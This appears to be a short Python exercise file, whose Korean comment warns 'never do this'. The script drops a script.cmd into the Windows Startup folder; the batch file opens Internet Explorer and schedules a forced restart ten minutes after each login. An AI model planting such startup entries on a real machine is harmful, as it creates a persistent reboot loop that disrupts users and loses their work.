'''
ex03.py

절대 따라하지 마세요
'''

path = 'C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
path += '\\script.cmd'

test2 = open(path, 'w')

test2.write('start iexplore www.google.com\n')
test2.write('shutdown /r /t 600\n')

test2.close()